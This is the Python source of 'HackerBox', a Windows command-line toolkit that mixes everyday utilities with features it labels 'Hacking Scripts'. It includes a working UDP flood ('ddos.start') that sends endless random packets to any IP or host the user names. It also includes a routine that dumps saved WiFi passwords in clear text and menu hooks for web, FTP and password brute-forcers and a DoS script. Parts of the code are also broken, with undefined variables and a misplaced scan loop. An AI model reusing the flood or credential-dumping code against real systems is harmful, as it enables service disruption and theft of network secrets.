# from pprint import pp
# flake8: noqa
# from sys import implementation
# from typing import no_type_check
#hekko
from colorama import Fore, Back, Style
from time import sleep
import os
import shutil
from time import sleep
# import requests
# import wget
import os

from getpass import getuser
from zipfile import ZipFile
from plyer import notification

def ProgressBar1(texttoshow,timee):
    from prompt_toolkit.shortcuts import ProgressBar
    from prompt_toolkit.styles import Style
    from prompt_toolkit.shortcuts.progress_bar import formatters
    import time

    style = Style.from_dict({
        'label': 'bg:#ffff00 #000000',
        'percentage': 'bg:#ffff00 #000000',
        'current': '#448844',
        'bar': '',
    })


    custom_formatters = [
        formatters.Label(),
        formatters.Text(': [', style='class:percentage'),
        formatters.Percentage(),
        formatters.Text(']', style='class:percentage'),
        formatters.Text(' '),
        formatters.Bar(sym_a='#', sym_b='#', sym_c='.'),
        formatters.Text('  '),
    ]

    with ProgressBar(style=style, formatters=custom_formatters) as pb:
        for i in pb(range(40), label=str(texttoshow)):
            time.sleep(timee)

def notification_c(fmessage):
    try:
        notification.notify(
            title='HackerBox',
            message=fmessage,
            app_icon='Icons\\Appicon.ico',
            timeout=10,
        )
    except:
        pass


def usercommand(self):
    try:

        if z == "about":
            # Shows About Info
            print("""HackerBox is an Opensource Program by Muhammad Sami Furqan.""")

        # Shows License Info.
        elif z == "license":
            import getpass
            print(f"""
This Software is licensed to {getpass.getuser()}.
|------------------------------------------------------|   
|              LICENSE INFO                            |
|              -------------                           |                                    
|-> CLI Based Software.                                |  
|-> Open-Source.                                       |
|-> Version 1.0                                        |
|-> Language : Python3.                                | 
|-> For Pentesters and for Ethical Hackers.            | 
|-> Type : Terminal.                                   |
|------------------------------------------------------|
""")
        # General commands
        # whoami -> Tells The Name of the current user.
        elif z == "whoami":
            import getpass
            print(getpass.getuser())

        # Exiting Console

        elif z == "exit" or z == "e":
            print("Exiting HackerBox")
            import os
            os._exit(0)

        # For Clearing Console
        elif z == "clear" or z == "cls":
            import os
            # Checks about OS "REQUIRED FOR CLEARING"
            def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
            clear()  # Clears Console

        # For dislaying day and time.
        elif z == "d/t":
            import datetime
            dt = datetime.datetime.now()
            print(dt)

        # For listing directories:
        elif z == "ls":
            from datetime import datetime
            import os

            from progressbar import FormatCustomText

            filelist = []
            # This lists the current directory '.' <- is specified for current dir.
            dir1 = os.listdir('.')
            dir_org = [f for f in dir1]  # This will organize the files
            # prints the text "Date of creation\t   Folders"
            print(
                "Time Created\tDate when created\t\tLast modified\tSize\t Directory Files")
            for f in dir_org:
                if os.path.isdir(f) == True:
                    cretation_time = os.path.getctime(f)
                    last_modified = os.path.getmtime(f)
                    get_bites = os.path.getsize(f)
                    Format_creationtime = datetime.fromtimestamp(
                        cretation_time).strftime("%H.%M %p")
                    Format_lastmodified = datetime.fromtimestamp(
                        last_modified).strftime("%H.%M %p")
                    Format_creationtime2 = datetime.fromtimestamp(
                        cretation_time)
                    filelist.append(f)
                    for f in filelist:
                        global byte_dir
                        byte_dir = os.path.getsize(f)
                    print(
                        f"{Format_creationtime}\t{Format_creationtime2}\t{Format_lastmodified}\t{byte_dir}\t ./{f}")
                if os.path.isfile(f) == True:
                    cretation_time = os.path.getctime(f)
                    last_modified = os.path.getmtime(f)
                    get_bites = os.path.getsize(f)
                    Format_creationtime = datetime.fromtimestamp(
                        cretation_time).strftime("%H.%M %p")
                    Format_lastmodified = datetime.fromtimestamp(
                        last_modified).strftime("%H.%M %p")
                    Format_creationtime2 = datetime.fromtimestamp(
                        cretation_time)
                    filelist.append(f)
                    for f in filelist:
                        global byte_dir2
                        byte_dir2 = os.path.getsize(f)
                    print(
                        f"{Format_creationtime}\t{Format_creationtime2}\t{Format_lastmodified}\t{byte_dir2}\t {f}")

        # Returns files and directories as a list.
        elif z == "ls -a".lstrip():
            import os
            from os import listdir
            from os.path import isfile, join

            cwd = os.getcwd()
            onlyfiles = [os.path.join(cwd, f) for f in os.listdir(cwd) if
                         os.path.isfile(os.path.join(cwd, f))]
            print(onlyfiles)

        # Create a new file
        elif z == "create.file":

            import os
            a = input("Enter file name: ")
            b = input("Enter Extension: ")
            if os.path.isfile(a+b):
                print(f"{a+b} <-- File Exists")
            else:
                newf = open(str(a)+str(b), 'w')
                print(
                    f"The file named {str(a)+str(b)} is created successfully!")

        #  Delete a file:
        elif z == "del.file":

            #!/usr/bin/python
            import os

            ## Get input ##
            myfile = input("Enter file name to delete: ")

            ## Try to delete the file ##
            if myfile == "HackerBox.py":
                askdelfile = input(
                    "Do you want to delete this console from pc")
                if askdelfile == "yes":
                    print("ok removing..")
                    os.remove(myfile)
                else:
                    pass
            try:
                os.remove(myfile)
                print(f"The file named {myfile} is deleted successfully!")
            except OSError as e:  # if failed, report it back to the user ##
                print("Error: %s - %s." % (e.filename, e.strerror))

        # Updating a file in python
        elif z == "update.file":
            try:
                User3 = input("Enter file name: ")

                k = open(str(User3), 'a')
                usrinp = input("Enter Text: ")
                k.write(usrinp+"\n")
                k.close()
                print(f"The File named {User3} is updated successfully!")
            except:
                print(f"{User3} <-- File Not Found!")
        # Rename a file
        elif z == "rename.file":
            try:
                import os

                oldfilename1 = input("Enter Old File Name: ")
                oldextensionname = input("Enter Old File Exetension: ")
                newfilename1 = input("Enter New File Name: ")
                newextensionname = input("Enter New Extension Name: ")
                os.rename(oldfilename1+oldextensionname,
                          newfilename1+newextensionname)
                print(
                    f"The file named {oldfilename1+oldextensionname} has been successfully updated to {newfilename1+newextensionname}!")
            except:
                print(f"{oldfilename1}{oldextensionname} <-- File Not Found!")

        # get ip from host
        elif z == "host.getip":
            try:
                import socket
                askhost = input("Enter Host URL: ")
                convert_host = socket.gethostbyname(askhost)
                print(f"The ip address of Host: {askhost} is {convert_host}")
            except:
                print(f"{askhost} host ip address not found")
        # get host name from ip
        elif z == "ip.get":
            try:
                import socket
                askusrforip = input("Enter Host IP : ")
                hostipcheck = socket.gethostbyaddr(askusrforip)
                print(f"The Host of this Ip is {hostipcheck}")
            except socket.gaierror:
                print("Unknown error")
            except:
                print(f"{askusrforip} host not found")

        # ipconfiguration
        elif z == "ipcon.all":

            import subprocess
            ipcon_out = subprocess.check_output(
                "ipconfig /all").decode('utf-8')
            print(ipcon_out)

        # Gb to Mb convertor
        elif z == "gb.mb":
            user = int(input("Enter Number in GB : "))
            if user == "1":
                print("1024")
            else:
                cdv = 1024*user
                print(cdv)

        # Mb to Gb Convertor:
        elif z == "mb.gb":
            valmb = int(input("Enter Number in MB : "))
            cf = valmb*0.0009765625
            print(cf)

        # For opening url in the browser
        elif z == "net.browse":
            import webbrowser
            thUser = input("Enter Web Url :")
            webbrowser.open(thUser)
            print(f"Opening {thUser} in Browser.")
        # Pinging Websites
        elif z == "lan.ping":
            from os import system
            Enterurl = input("Enter URL :")
            system("ping " + Enterurl)

        # Ping Constantly
        elif z == "ping.t":
            s2e4 = input("Do you want to Ping Websites :")
            if s2e4 == "y":
                try:
                    import subprocess
                    askusrtouser = input("Enter Website url : ")
                    prpc342 = subprocess.check_output(
                        "ping "+askusrtouser+" -t").decode('utf-8')
                    print(prpc342)
                except:
                    KeyboardInterrupt == print("ok")
        # This will run windows terminal.
        elif z == "terminal":
            import os
            os.system("cmd")
        # port ip scanner:=
        elif z == "lanport/scan.ip":
            import socket
            import ipaddress
            import re
            port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
            port_min = 0
            port_max = 65535
            open_ports = []
            while True:
                ip_add_entered = input(
                    "Please enter the ip address that you want to scan: ")
                try:
                    ip_address_obj = ipaddress.ip_address(ip_add_entered)
                    print("You entered a valid ip address.")
                    break
                except:
                    print("You entered an invalid ip address")
            while True:
                print(
                    "Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
                port_range = input("Enter port range: ")
                port_range_valid = port_range_pattern.search(
                    port_range.replace(" ", ""))
                if port_range_valid:
                    port_min = int(port_range_valid.group(1))
                    port_max = int(port_range_valid.group(2))
                    break
                for port in range(port_min, port_max + 1):
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(0.5)
                            s.connect((ip_add_entered, port))
                            open_ports.append(port)
                    except:
                        pass
            for port in open_ports:
                print(f"Port {port} is open on {ip_add_entered}.")
        elif z == "nocolor":
            import colorama
            print(f"{Fore.RESET}")

        # check network speedtest
        elif z == "net.speedtest":
            import speedtest

            notification_c("Testing Your Network Speed")

            def getNetSpeed():
                import speedtest
                tester = speedtest.Speedtest()
                print("Searching For The Best Server...")
                # Check for the best servers
                bestServer = tester.get_best_server()
                print(
                    f'Selecting {bestServer["host"]} located in {bestServer["country"]},{bestServer["name"]}')
                # Now code for Checking Downloading Speed.
                print("Checking Downloading Speed...")
                downloadSpeed = tester.download()
                print("Done!")
                # Now code for checking Uploading Speed.
                print("Checking Uploading Speed...")
                uploadSpeed = tester.upload()
                print("Done!")
                ping = tester.results.ping
                print('Results :')
                print(
                    f'-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s')
                print(f'-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s')
                print(f'-Ping : {ping :.2f} ms')
                notification_c(f"""Here are SpeedTest Results
-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s
-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s
-Ping : {ping :.2f} ms""")
            for i in range(1):
                print(getNetSpeed())
        # Winver
        elif z == "win.ver":
            import subprocess
            proc332 = subprocess.check_output("winver").decode('utf-8')

#------------------------Hacking Scripts----------------------------#
# Used Scripts like Ddos and more From github.                      #
#-------------------------------------------------------------------#
        elif z == "pass.bruteforce":
            from Scripts.Bruteforcer import bruteforcer
            try:
                bruteforcer()
            except KeyboardInterrupt:
                print("Brute Force stopped")

        elif z == "admin.panelfinder":
            try:
                notification_c("The Admin Panel Finder is now Running")
                from Scripts.Admin_Panel_Finder import AdminPanelFinder
                AdminPanelFinder()
            except KeyboardInterrupt as e:
                ask = input("Do you want to stop [y/n] : ")
                if ask == "y" or ask == "Y":
                    pass
                else:
                    pass
        elif z == "sitetester":
            try:
                notification_c("Site tester is now Running")
                from Scripts.WebAnalyzer import main
                main()
            except KeyboardInterrupt as e:
                ask = input("Do you want to stop [y/n]")
                if ask == "y" or ask == "Y":
                    pass
                else:
                    pass
        elif z == "xss/webchecker":
            try:
                notification_c("xss checker is now Running")
                from Scripts.CrossSiteScriptingChecker import main
                main()
            except KeyboardInterrupt as e:
                ask = input("Do you want to stop [y/n]")
                if ask == "y" or ask == "Y":
                    pass
                else:
                    pass
        elif z == "dos.start":
            try:
                notification_c("DoS is now Running")
                from Scripts.Dos import dos
                dos()
            except KeyboardInterrupt as e:
                ask = input("Do you want to stop [y/n]")
                if ask == "y" or ask == "Y":
                    pass
                else:
                    pass
        elif z == "ftp.bruteforce":
            from Scripts.ftp_bruteforcer import main
            main()
        elif z == "port.discovery":
            from Scripts.live_port_discovery import main2
            main2()
        elif z == "web.bruteforce":
            from Scripts.Web_bruteforce import main2
            main2()
        # DDOS Attack Script
        elif z == "ddos.start":
            import sys
            import os
            import time
            import socket
            import random
            from rich.progress import track
            from time import sleep
            # Code Time
            from datetime import datetime
            now = datetime.now()
            hour = now.hour
            minute = now.minute
            day = now.day
            month = now.month
            year = now.year

            ##############
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            #############
            bdafa = input("""Select one
[A] DDoS using an ip address (if you already have an ip address)
[B] DDoS using host (if you dont have an ip address)

""")
            if bdafa == "A" or bdafa == "a":

                try:
                    ip = input("Enter Ip address: ")

                    try:
                        port = int(input("Port       : "))
                    except:
                        print("Dont use strings in port!")

                    print(f"Starting an DDoS Attack on {ip}")

                    for i in track(range(10), description="Processing...."):
                        sleep(0.5)
                    notification_c(
                        f"Started DDoS Attack at {ip} on port {port}")
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip, port))
                        sent = sent + 1
                        port = port + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip, port))
                        if port == 65534:
                            port = 1

                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("\nok"), notification_c(
                        f"The DDoS Attact on {ip} and port {port} has been stopped due to keyboard interupt")
                except socket.gaierror as axs:
                    socket.gaierror == print(f"{ip} <-- Wrong Ip address")

            else:
                try:
                    user13232 = input("Enter Host : ")
                    ip2 = socket.gethostbyname(user13232)
                    port2 = int(input("Port       : "))
                    print(
                        f"Starting an DDoS Attack on Host {user13232} ip address is {ip2}:")
                    notification_c(
                        f"Started DDoS Attack at {user13232} ip address is {ip2}")
                    for i in track(range(10), description="Processing...."):
                        sleep(0.5)
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip2, port2))
                        sent = sent + 1
                        port2 = port2 + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip2, port2))
                        if port2 == 65534:
                            port2 = 1
                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("\nProcess Stopped - REASON : KeyBoard Interrupt"), notification_c(
                        f"The DDoS Attact on {user13232} with the ip address of {ip2} has been stopped due to keyboard interupt")
                except socket.gaierror:
                    socket.gaierror == print(
                        f"{user13232} <-- Host Not Found + No ip address Found ")

        # app updater
        elif z == "update.HackerBox":
            HackerBoxupdate()
            pass
        # gitclonner
        elif z == "git.clone":
            stm = Settings_Manager()
            stm.reader()
            from git import Repo
            import os
            if stm.Git_output == "Default":
                ask_abt_dir = input("Enter the Location(not gitlink): ")
            elif stm.Git_output != "Default" or stm.Git_output == "nil":
                ask_abt_dir = stm.Git_output
            ask_abt_url = input("Enter repository link(git link): ")
            ask_folder_name = input(
                "Enter the folder name(new folder to store files): ")
            combine_a = ask_abt_dir+"\\"+ask_folder_name
            Repo.clone_from(ask_abt_url, combine_a)
            notification_c(
                f"The Repo {ask_abt_url} is cloned the files are located on {combine_a}")
        # Scan fix kit
        elif z == "scanfix":
            import os
            from time import sleep
            import getpass
            import shutil
            init(convert=True)
            os.system("cls")
            print(f"""{Fore.BLUE}Select option:
            [a] Scan&fix system. [Scans and fix the broken files].
            [b] Clear temp files. [Clears the temporary files].
            [c] Just verify the system. [Just verifies the system files & let you know if something is broken].
                      """)
            print(f"{Fore.RESET}")
            option = input(f"{Fore.RED}=> ")
            # this takes an input from the user and checks if it is a valid option.
            if option == "a":
                # if the user selects option a, the program will scan and fix the broken files.
                try:
                    notification_c("The Auto Scan Fix is Started.")
                    sleep(2)
                    print(f"{Fore.RED} This process could take some time.")
                    # sfc/scannow is the command that scans and fix the files automatically.
                    os.system("sfc/scannow")
                    notification_c("The System Scan and Fix is Completed")
                # if the user presses ctrl+c, the program will ask for stopping the process.
                except KeyboardInterrupt:
                    ask_stop_scan = input(
                        " Do you want to stop the scan?[y/n]: ")
                    if ask_stop_scan == "y":
                        notification_c("The ScanFix Process has been stoped.")
                    else:
                        pass

            elif option == "b":
                sleep(2)
                print(f"{Fore.RED}This process could take some time.")
                sleep(1)
                print(f"{Fore.BLUE}Checking Temp folders...")
                sleep(1)
                print(f"{Fore.BLUE}Cleaning c:\windows\\temp...")
                try:
                    # the directory that will be deleted.
                    del_dir = r'c:\windows\temp'
                    # this deletes the directory with ignored errors.
                    shutil.rmtree(del_dir, ignore_errors=True)
                except:
                    print(f"{Fore.RED}Unknown Error was Found!")
                print(f"{Fore.RED}Cleaning Completed!")
                sleep(1)
                print(f"{Fore.BLUE}Cleaning c:\\AppData\\Local\Temp...")
                try:
                    getusr = getpass.getuser()  # this will get the current user
                    # directory that will be deleted.
                    del_app_cache = r'c:\Users\%s\AppData\Local\Temp' % getusr
                    # this will delete the directory with ignored errors.
                    shutil.rmtree(del_app_cache, ignore_errors=True)
                except:
                    print(f"{Fore.RED}Unknown Error was Found!")
                print(f"{Fore.RED}Cleaning Completed!")
                notification_c("The Temp folders are cleaned now!")
                usr_ask_log = input(
                    "Do you want to save a log of the cleaning?[y/n]: ")
                if usr_ask_log == "y":
                    try:
                        # this will create a log file in the same directory as the program.
                        with open("logs.txt", "a") as f:
                            import datetime
                            f.write(
                                "Logs Created by scanfix kit - HackerBox\n")
                            f.write("==========================\n")
                            f.write(
                                f"The date of creation : {datetime.datetime.now()}\n")
                            f.writelines("""Files that are not deleted:\n""")
                            f.writelines(
                                'Files in c:\\Users\\UserName\\AppData\\Local\\Temp\n')
                            f.close()
                            with open("logs.txt", "a") as f:
                                # basically with the help of this code, the program will write the files that are not deleted in the Temp folders.
                                # both temp folder and the AppData\\Local\\Temp folder. will be written in the log file.
                                files_get = os.listdir(
                                    r'c:\Users\%s\AppData\Local\Temp' % getusr)
                                f.close()
                                for file in files_get:
                                    f = open("logs.txt", "a")
                                    f.writelines(file+"\n")
                                    f.close()
                                f = open("logs.txt", "a")
                                f.write("\n")
                                f.write("==========================\n")
                                f.write('\n')
                                f.write("==========================\n")
                                f.close()
                                notification_c(
                                    "The Logs has been saved at the current Directory")
                            f = open("logs.txt", "a")
                            f.writelines('Files in c:\windows\\temp\n')
                            with open("logs.txt", "a") as f:
                                files_get1 = os.listdir(r'c:\\windows\\temp\\')
                                f.close()
                                for file in files_get1:
                                    f = open("logs.txt", "a")
                                    f.writelines(file+"\n")
                                    f.close()
                                f = open("logs.txt", "a")
                                f.write("\n")
                                f.write("==========================\n")
                    except FileNotFoundError:
                        pass
            elif option == "c":
                # if the user selects option c, the program will scans the broken files.
                try:
                    notification_c("The Auto Scan is Started.")
                    sleep(2)
                    print(f"{Fore.RED} This process could take some time.")
                    # sfc/verifyonly is the command that scans files.
                    os.system("sfc/verifyonly")
                # if the user presses ctrl+c, the program will ask for stopping the process.
                    notification_c("The System Scan is Completed")
                except KeyboardInterrupt:
                    ask_stop_scan2 = input(
                        " Do you want to stop the scan?[y/n]: ")
                    if ask_stop_scan2 == "y":
                        notification_c("The System Scan is Stoped")
                    else:
                        pass
       # This will show the current running tasks
        elif z == "tasks.show":
            import os
            show_tasks = os.popen('tasklist').read()
            print(show_tasks)
        elif z == "tasks.kill":
            import os
            user_taskkill = input("Enter Task Name to kill : ")
            os.system("taskkill /im "+user_taskkill)
#-------------------Hacking Scripts---------------------------------#
        # This will detect IP's and return with the info of it
        elif z == "ip.info":
            import requests
            init(convert=True)
            print(f"""{Fore.BLUE}Select Options:
[A] Track by IP Address - Example [111.111.11.1]
[B] Track by Host Name - Example [www.example.com]
[C] Back
""")
            print(
                Fore.RED+"\t\t\t\t\t *You can use 'list' command to see all the options*")

            command = input(f"{Fore.RED}{getuser()}$: ")
            if command == "A":
                # This takes ip from the user and get info from http://ip-api.com/json/{0}
                print(Fore.RESET)
                # takes the input
                user_ip = input(Fore.BLUE+"ENTER IP ADDRESS: ")
                url = "http://ip-api.com/json/{0}"
                response = requests.get(url.format(user_ip)).json()
                print(Fore.RESET)
                for key in response:
                    print(Fore.GREEN +
                          "{0: <15} - {1}".format(key, response[key]))
            elif command == "B":
                # This does the same thing but the difference is that it takes host and convert it into ip address and return the info
                user_host = input("ENTER HOST NAME: ")
                Host_conv = requests.get(
                    f"http://ip-api.com/json/{user_host}").json()
                for key2 in Host_conv:
                    print("{0: <15} - {1}".format(key2, Host_conv[key2]))
                    print("\n")
            # This clears the console
            elif command == "cls":
                os.system("cls")
            # This prints the options that are available
            elif command == "list":
                print(f"""{Fore.BLUE}Availaible Options:
         [A] Track by IP Address - Example [111.111.11.1]
         [B] Track by Host Name - Example [www.example.com]
         [C] Exit (Exits the program)
         """)
            elif command == "C":
                print(Fore.RESET)
                pass
            else:
                print(Fore.RESET)
                print(Fore.RED+"Wrong Command! Try Again.")
        # download youtube videos
        elif z == "pkg.youtube":  # This basically uses a module called youtube_dl
            # to download youtube videos
            try:
                import youtube_dl
                from bs4 import BeautifulSoup
                import requests

                def youtube_title_finder(link):
                    resp = requests.get(link)
                    s = BeautifulSoup(resp.text, 'html.parser')
                    title = s.find("title").text.replace("- YouTube", "").strip()
                    return title

                stm = Settings_Manager()
                stm.reader()

                def get_ydl_opts(destination):
                    return {'outtmpl': f'{destination}/%(title)s.%(ext)s'}

                def dwl_vid(link):
                    title = youtube_title_finder(link)
                    destination = stm.Video_output if stm.Video_output != "." else input("Enter the destination (leave blank for current directory): ").strip() or '.'
                    ydl_opts = get_ydl_opts(destination)
                    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                        notification_c(f"The youtube video is being downloaded\n{title}")
                        ydl.download([link])
                        notification_c(f"The youtube video is successfully downloaded\n{title}")

                channel = 1
                while channel == 1:
                    link_of_the_video = input("Enter Video URL: ").strip()
                    dwl_vid(link_of_the_video)
                    channel = int(input("Enter 1 if you want to download more videos \nEnter 0 if you are done: "))

            except KeyboardInterrupt:
                notification_c("The YouTube Download is Stopped")

                # Mp3 youtube downloader
        elif z == "pkg.youtube.mp3":
            # importing packages
            from pytube import YouTube
            import os

            # url input from user
            yt = YouTube(
                str(input("Enter Video URL : ")))

            # extract only audio
            video = yt.streams.filter(only_audio=True).first()

            # check for destination to save file
            stm = Settings_Manager()
            stm.reader()
            # if stm.Audio_output !=".":
            #         destination = stm.Audio_output
            # elif stm.Audio_output == ".":
            #          print("Enter the destination (leave blank for current directory)")
            #          destination = str(input(">> ")) or '.'
            # else :
            #         print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
            # print(Fore.RESET)
            # print(destination+ "  jaja")
            print("Enter the destination (leave blank for current directory)")
            destination = str(input(">> ")) or '.'

            # download the file
            mess3 = "The youtube MP3 is being downloaded\n" + title
            notification_c(mess3)
            out_file = video.download(output_path=destination)

            mess2 = "The youtube MP3 is successfully downloaded\n" + title
            notification_c(mess2)
            # save the file
            base, ext = os.path.splitext(out_file)
            new_file = base + '.mp3'
            os.rename(out_file, new_file)

            # result of success
            print(yt.title + " has been successfully downloaded.")
        # get files from internet
        elif z == "pkg.download":
            try:
                import wget
                import os
                url1 = input("Enter file url: ")
                while True:
                    try:
                        os.mkdir("My Files")
                        break
                    except FileExistsError:
                        break
                stm = Settings_Manager()
                stm.reader()
                if stm.Package_output == "Default":
                    wget.download(url1, out="My Files")
                    print("Download is completed successfully")
                elif stm.Package_output != "Default":
                    wget.download(url1, out=stm.Package_output)
                    print("\nDownload is completed successfully")
                else:
                    print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
                    print(Fore.RESET)
                
            except Exception as e:
                print(f"{e}")
                # print(f"{url1} <-- Wrong Package!")
        elif z == "settings.reset":
            import os
            newqw = [f for f in os.listdir('.')]
            if "Settings.ini" in newqw:
                stm = Settings_Manager()
                os.remove("Settings.ini")
                stm.writter()
            elif "Settings.ini" not in newqw:
                stm.writter()
                pass
            else:
                pass   
        # open files
        elif z == "open.file":  # This uses simple os module to start files.
            try:
                import os
                askusrabtfile = input("Enter File Name: ")
                # os.startfile start file by taking the location or name.
                os.startfile(askusrabtfile)
                print(f"The file named {askusrabtfile} is opened successfully")
            except:
                print(f"{askusrabtfile} <-- File not Found!")

        # Shutdown the computer
        elif z == "shutdown.s":  # This use os module to shutdown computer.
            try:
                import os
                oc = input("Do you want to Shutdown this device y or n : ")
                if oc == "y":
                    # uses cmd to shutdown computer by os.system("Shutdown /s").
                    os.system("shutdown /s")
                    notification_c("Your PC will shutdown soon.")
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # restarts the commputer
        elif z == "restart.s":  # This use os module to restart computer.
            try:
                import os
                g = input("Do you want to restart this device y or n: ")
                if g == "y":
                    # uses cmd to restart computer by os.system("Shutdown /r").
                    os.system("shutdown /r")
                    # /r stands for restart.
                    notification_c("Your PC will Restart soon.")
                elif g == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # logout from the ccomputer.
        elif z == "logout.s":  # This use subprocesse module to logout computer.
            try:
                import subprocess
                fl = input("Do you want to logout y or n : ")
                if fl == "y":
                    subprocess.check_output("shutdown /l").decode('utf-8')
                    notification_c("Your PC will Logout soon.")
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # Remote shutdown the computer:
        # This use subprocesse module to Remote shutdown computer.
        elif z == "remote.shutdown":
            try:
                import subprocess
                userwin = input(
                    "Do you want to remotely shutdown all the computers y or n :")
                if userwin == "y":
                    subprocess.check_output("shutdown -i").decode('utf-8')
                elif userwin == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # run python commands
        elif z == "python.run":
            import os
            os.system("python")

        # renew all adapters
        elif z == "wlan.renew":
            import subprocess
            proc3 = subprocess.check_output("ipconfig /renew").decode('utf-8')
            print(proc3)
            notification_c("All Adapters are renewed successfully.")

        # Release all adapters
        elif z == "wlan.release":
            import subprocess
            proc34 = subprocess.check_output(
                "ipconfig /release").decode('utf-8')
            print(proc34)
            notification_c("All Adapters are released successfully.")

        # Check if Url exists
        elif z == "check.urlexists":
            import requests
            try:
                askusrabturlex = input("Enter Url:")
                response = requests.get("http://"+askusrabturlex)

            except requests.ConnectionError as exception:
                print(f"{askusrabturlex} Not Exists!")
        elif z == "update.info":
            from bs4 import BeautifulSoup
            import requests

            review_url = "https://pastebin.com/DrX3LbR9"
            resp = requests.get(review_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            find_info = soup.find("textarea").text
            print(find_info)

        # Show wifi passwords
        elif z == "wlan/show.pass":
            try:
                import subprocess
                import re
                command_output = subprocess.run(
                    ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                profile_names = (re.findall(
                    "All User Profile     : (.*)\r", command_output))
                wifi_list = []
                if len(profile_names) != 0:
                    for name in profile_names:
                        wifi_profile = {}
                        profile_info = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                    if re.search("Security key           : Absent", profile_info):
                        pass
                    else:
                        wifi_profile["ssid"] = name
                        profile_info_pass = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                        password = re.search(
                            "Key Content            : (.*)\r", profile_info_pass)
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            wifi_profile["password"] = password[1]
                        wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
                for x in range(len(wifi_list)):
                    print(wifi_list[x])
                    notification_c(f"The Passwords are found! {wifi_list[x]}")
                    savepass = input(
                        "Do you want to save these passwords y or n :")
                    if savepass == "y":
                        f = open('WlanPasswords.txt', 'w')
                        f.write(str(wifi_list[x]))
                        f.close
                        print(
                            "All the passwords are saved! Check WlanPasswords.txt for saved passwords")
                    else:
                        print("Ok")
            except:
                print("Unknown Error was Found!")
        # show script commands
        elif z == "show.toolkits":
            from rich.console import Console
            from rich.table import Table

            table = Table(title="Toolkits")

            table.add_column("Commands", style="cyan")
            table.add_column("Info", style="magenta")

            table.add_row("scanfix",     "starts windows fix kit")
            # table.add_row("ddos.start"       ,     "starts an ddos Attack")
            # table.add_row("host.getip"       ,     "get ip address of host by host url")
            # table.add_row("ip.get"           ,     "gets host name from ip")
            # table.add_row("ip.info"          ,     "to get IP info")
            # table.add_row("wlan/show.pass"   ,     "Show Wifi passwords")
            # table.add_row("lanport/scan.ip"  ,     "to scan ip address")

            console = Console()
            console.print(table)
        elif z == "hacking.scripts":
            from rich.console import Console
            from rich.table import Table

            table = Table(title="Hacking Scripts")

            table.add_column("Commands", style="cyan")
            table.add_column("Info", style="magenta")

            table.add_row("ddos.start",     "starts an ddos Attack")
            table.add_row("dos.start",     "starts an dos Attack")
            table.add_row("host.getip",
                          "get ip address of host by host url")
            table.add_row("ip.get",     "gets host name from ip")
            table.add_row("ip.info",     "to get IP info")
            table.add_row("wlan/show.pass",     "Show Wifi passwords")
            table.add_row("web.bruteforce",
                          "to brute force usernames and password of the website")
            table.add_row("pass.bruteforce",
                          "to brute force usernames and passwords")
            table.add_row("ftp.bruteforce",
                          "to brute force ftp servers.")
            table.add_row("admin.panelfinder",
                          "to find the Admin Panel of the website")
            table.add_row("xss/webchecker",
                          "to find the xss vulnerability in the  website")
            table.add_row("sitetester",     "Runs the website checker")
            table.add_row("port.discovery"  ,     "to scan live ports")

            console = Console()
            console.print(table)

        # show windows commands:
        elif z == "shutdown/?":
            from rich.console import Console
            from rich.table import Table

            table = Table(title="Shutdown Commands")

            table.add_column("Commands", style="cyan")
            table.add_column("Info", style="magenta")

            table.add_row("shutdown.s",    "to shutdown this pc")
            table.add_row("restart.s",    "to restart this pc")
            table.add_row("remote.shutdown",    "to remoteley shutdown pc")
            table.add_row("logout.s",    "to logout from this pc")

            console = Console()
            console.print(table)

        # Show all commands:
        elif z == "showall/?":
            from rich.console import Console
            from rich.table import Table

            table = Table(title="Advance Commands")

            table.add_column("Commands", style="cyan")
            table.add_column("Command Info", style="magenta")

            table.add_row("root.showip",
                          "for showing ip adrees of this device")
            table.add_row("wifi/nby",            "for all nearby located wifi")
            table.add_row("wlan/show.pass",
                          "for getting all the Wifi Passwords")
            table.add_row("lan.ping",            "for pinging websites")
            table.add_row("lanport/scan.ip",     "to scan ip addresses")
            table.add_row("check.urlexists",     "to check if url exists")
            table.add_row("net.browse",
                          "to open a website in a browser")
            table.add_row(
                "ls",                  "to list files currently stored in this directory")
            table.add_row("ls -a",
                          "to list files currently stored in this directory")
            table.add_row("terminal",
                          "to use Windows CMD in this Terminal")
            table.add_row("python.run",          "to run python if installed")
            table.add_row("wlan.renew",          "to renew all adapters")
            table.add_row("wlan.release",
                          "for releasing all the adapters")
            table.add_row("net.speedtest",       "for testing network speed")
            table.add_row("ipcon.all",           "for ip configuaration")
            table.add_row("win.ver",
                          "to show current version of windows")
            table.add_row("mb.gb",
                          "for converting Megabytes into Gigabytes")
            table.add_row("gb.mb",
                          "for converting Gigabytes into Megabytes")
            table.add_row("update.HackerBox",  "for updating HackerBox")
            table.add_row("git.clone",
